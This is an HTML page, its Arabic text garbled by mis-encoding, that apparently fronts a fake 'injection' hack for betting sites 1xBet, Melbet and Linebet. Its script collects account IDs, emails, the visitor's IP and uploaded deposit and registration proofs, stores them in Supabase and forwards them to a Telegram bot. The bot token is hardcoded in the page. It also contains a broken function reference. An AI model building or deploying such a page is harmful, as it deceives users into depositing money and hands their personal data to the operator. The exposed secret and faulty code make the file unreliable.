<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¥Ù†Ø´Ø§Ø¡ Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div id="loadingText" style="color:var(--hacker-green); font-family:'Fira Code';">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</div>
    </div>

    <div id="customModal" class="modal-overlay">
        <div class="modal-box">
            <h3 id="modalTitle" style="color:var(--hacker-green);">ØªÙ†Ø¨ÙŠÙ‡</h3>
            <p id="modalMsg" style="color:#ddd; margin:15px 0;">...</p>
            <button onclick="document.getElementById('customModal').classList.remove('active')" style="padding:10px;">Ù…ÙˆØ§ÙÙ‚</button>
        </div>
    </div>

    <div class="container" id="mainContainer">
        <h2 id="typewriterTitle"></h2>

        <label class="title">>> 01. Ø§Ø®ØªØ± Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù:</label>
        <div class="program-grid">
            <div class="program-option" onclick="selectProgram('1xBet', this)">
                <i class="fa-solid fa-x text-2xl" style="font-size: 2rem; color: #3b82f6;"></i>
                <span>1xBet</span>
            </div>
            <div class="program-option" onclick="selectProgram('Melbet', this)">
                <i class="fa-solid fa-m text-2xl" style="font-size: 2rem; color: #eab308;"></i>
                <span>Melbet</span>
            </div>
            <div class="program-option" onclick="selectProgram('Linebet', this)">
                <i class="fa-solid fa-l text-2xl" style="font-size: 2rem; color: #22c55e;"></i>
                <span>Linebet</span>
            </div>
        </div>

        <label class="title">>> 02. Ø§Ù„ÙƒÙˆØ¯ / Ø§Ù„Ø±Ø§Ø¨Ø·:</label>
        <div class="input-wrapper">
            <input type="text" id="targetLink" class="form-input" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„ÙƒÙˆØ¯ Ø£Ùˆ Ø§Ù„Ø±Ø§Ø¨Ø· Ù‡Ù†Ø§...">
            <button class="paste-btn-embedded" onclick="pasteToInput()" title="Ù„ØµÙ‚">
                <i class="fa-solid fa-paste"></i>
            </button>
        </div>

        <label class="title" style="margin-top: 20px;">>> 03. Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨:</label>
        <textarea id="userData" rows="3" placeholder="Ø§Ù„Ø¢ÙŠØ¯ÙŠ (ID) ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ..."></textarea>

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px;">
            <div>
                <label class="title" style="font-size:0.8rem">Ø¥Ø«Ø¨Ø§Øª Ø§Ù„ØªØ³Ø¬ÙŠÙ„:</label>
                <label for="regProof" class="upload-box" id="regBox">
                    <div id="regText">Ø§Ø¶ØºØ· Ù„Ù„Ø±ÙØ¹ ğŸ“‚</div>
                    <input type="file" id="regProof" accept="image/*" onchange="handleFile(this, 'regBox', 'regText')">
                </label>
            </div>
            <div>
                <label class="title" style="font-size:0.8rem">Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹:</label>
                <label for="depProof" class="upload-box" id="depBox">
                    <div id="depText">Ø§Ø¶ØºØ· Ù„Ù„Ø±ÙØ¹ ğŸ’°</div>
                    <input type="file" id="depProof" accept="image/*" onchange="handleFile(this, 'depBox', 'depText')">
                </label>
            </div>
        </div>

        <button id="submitBtn" onclick="submitRequest()">ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ø­Ù‚Ù† ÙˆØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯</button>
        <button onclick="window.location.href='index.html'" style="background:transparent; border:1px solid #555; color:#aaa; margin-top:10px;">Ø¥Ù„ØºØ§Ø¡</button>
    </div>

    <div class="container" id="successContainer" style="display: none;">
        <h2 style="color:var(--hacker-green)">âœ… ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨</h2>
        <p style="color:#ccc;">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©. Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù‡Ùˆ:</p>
        
        <div style="background:#111; padding:20px; border:1px dashed var(--hacker-green); font-family:'Fira Code'; font-size:1.5rem; margin:20px 0; color:var(--hacker-green);" id="generatedCodeDisplay">
            CODE-XXXX
        </div>

        <p style="font-size:0.8rem; color:var(--warning-orange);">* Ø§Ù„ÙƒÙˆØ¯ Ø­Ø§Ù„ÙŠØ§Ù‹ (Ù‚ÙŠØ¯ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±). Ø³ÙŠØªÙ… ØªÙØ¹ÙŠÙ„Ù‡ Ø¨Ø¹Ø¯ Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ø£Ø¯Ù…Ù†.</p>
        
        <button onclick="copyGeneratedCode()">Ù†Ø³Ø® Ø§Ù„ÙƒÙˆØ¯</button>
        <button onclick="window.location.href='index.html'" style="background:transparent; border:1px solid #555; margin-top:10px;">Ø¹ÙˆØ¯Ø©</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Supabase (Ù†ÙØ³ Ù…ÙØ§ØªÙŠØ­Ùƒ)
        const SUPABASE_URL = 'https://zflgifemhopabfzgczgs.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_9xZcd3BkgL6cEQwHJitrew_mbX74lJW';
        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
        const TELEGRAM_TOKEN = '8362386006:AAF8yKWrs7LCKva6zcu379Vn-vma1xbjF1s';
        const ADMIN_CHAT_ID = '8114406682';

        let selectedSystem = null;
        let userIP = "Unknown";

        // ØªØ£Ø«ÙŠØ± Ø§Ù„ÙƒØªØ§Ø¨Ø©
        function typeWriter(text, elementId) {
            let i = 0; const target = document.getElementById(elementId); target.innerHTML = "";
            function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 50); } }
            type();
        }
        window.onload = async () => {
            typeWriter("Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ÙÙŠØ± // Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯", "typewriterTitle");
            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); userIP = data.ip; } catch(e){}
        };

        // Ø¯Ø§Ù„Ø© Ø§Ù„Ù„ØµÙ‚
        async function pasteToInput() {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('targetLink').value = text;
            } catch (err) { alert('ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø­Ø§ÙØ¸Ø©'); }
        }

        function selectSystem(name, el) {
            selectedSystem = name;
            document.querySelectorAll('.program-option').forEach(opt => opt.classList.remove('selected'));
            el.classList.add('selected');
        }

        function handleFile(input, boxId, textId) {
            if(input.files[0]) {
                document.getElementById(boxId).classList.add('uploaded');
                document.getElementById(textId).innerHTML = '<i class="fa-solid fa-check"></i> ØªÙ… Ø§Ù„Ø§Ø®ØªÙŠØ§Ø±';
            }
        }

        function toggleLoading(show) { document.getElementById('loadingOverlay').classList.toggle('active', show); }
        function showModal(title, msg) {
            document.getElementById('modalTitle').innerText = title;
            document.getElementById('modalMsg').innerText = msg;
            document.getElementById('customModal').classList.add('active');
        }

        async function uploadFile(file) {
            const fileName = `${Date.now()}_${Math.random().toString(36).substring(7)}`;
            const { data, error } = await _supabase.storage.from('proofs').upload(fileName, file);
            if (error) throw error;
            const { data: publicUrl } = _supabase.storage.from('proofs').getPublicUrl(fileName);
            return publicUrl.publicUrl;
        }

        async function submitRequest() {
            const link = document.getElementById('targetLink').value;
            const userData = document.getElementById('userData').value;
            const regFile = document.getElementById('regProof').files[0];
            const depFile = document.getElementById('depProof').files[0];

            if (!selectedSystem) return showModal("Ø®Ø·Ø£", "ÙŠØ¬Ø¨ Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù†Ø¸Ø§Ù… Ø£ÙˆÙ„Ø§Ù‹");
            if (!link || !userData) return showModal("Ø®Ø·Ø£", "Ø£ÙƒÙ…Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ©");
            if (!regFile || !depFile) return showModal("Ø®Ø·Ø£", "ÙŠØ¬Ø¨ Ø±ÙØ¹ ØµÙˆØ± Ø§Ù„Ø¥Ø«Ø¨Ø§Øª");

            toggleLoading(true);

            try {
                // Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±
                const regUrl = await uploadFile(regFile);
                const depUrl = await uploadFile(depFile);
                
                // ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯
                const code = 'KEY-' + Math.floor(10000 + Math.random() * 90000);
                
                // Ø¯Ù…Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                const fullInfo = `Ø§Ù„Ù†Ø¸Ø§Ù…: ${selectedSystem}\nØ§Ù„Ø±Ø§Ø¨Ø·/Ø§Ù„ÙƒÙˆØ¯: ${link}\nØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${userData}\nIP: ${userIP}`;

                // Ø§Ù„Ø­ÙØ¸ ÙÙŠ Supabase
                await _supabase.from('requests').insert([{
                    user_data: fullInfo,
                    reg_proof_url: regUrl,
                    dep_proof_url: depUrl,
                    generated_code: code
                }]);

                await _supabase.from('active_codes').insert([{ code: code, is_active: false }]);

                // Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
                const msg = `ğŸ”¥ *Ø·Ù„Ø¨ ØªÙØ¹ÙŠÙ„ Ø¬Ø¯ÙŠØ¯*\nğŸ’» Ø§Ù„Ù†Ø¸Ø§Ù…: ${selectedSystem}\nğŸ”— Ø§Ù„ÙƒÙˆØ¯: \`${link}\`\nğŸ‘¤ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${userData}\nğŸ”‘ ÙƒÙˆØ¯ Ø§Ù„ØªÙØ¹ÙŠÙ„: \`${code}\`\nğŸŒ IP: ${userIP}`;
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });

                toggleLoading(false);
                document.getElementById('mainContainer').style.display = 'none';
                document.getElementById('successContainer').style.display = 'block';
                document.getElementById('generatedCodeDisplay').innerText = code;

            } catch (error) {
                console.error(error);
                toggleLoading(false);
                showModal("ÙØ´Ù„", "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±");
            }
        }

        function copyGeneratedCode() {
            const code = document.getElementById('generatedCodeDisplay').innerText;
            navigator.clipboard.writeText(code);
            alert("ØªÙ… Ø§Ù„Ù†Ø³Ø®!");
        }
    </script>
</body>
</html>
